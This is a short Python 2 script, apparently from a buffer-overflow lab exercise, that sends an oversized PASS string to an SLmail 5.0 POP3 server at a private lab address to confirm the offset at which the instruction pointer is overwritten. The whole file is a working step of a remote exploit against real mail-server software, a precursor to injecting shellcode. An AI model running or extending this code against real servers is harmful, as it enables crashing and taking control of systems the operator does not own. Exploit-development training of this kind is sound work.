#! /usr/bin/python

# This code is an exploit for third step of the BOF attack to SLmail 5.0.
# It verifies the postion of EIP found in previous step. 

import socket

buffer=('A'*2606 +'B'*4+'c'*400)

try: 
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
    print "\nSending evil buffer..." 
    s.connect(("192.168.56.112",110)) 
    s.recv(1024) 
    s.send("USER test" + '\r\n') 
    s.recv(1024) 
    s.send('PASS ' + buffer + '\r\n') 
    print"\nDone!." 
except: print "Could not connect to POP3!"
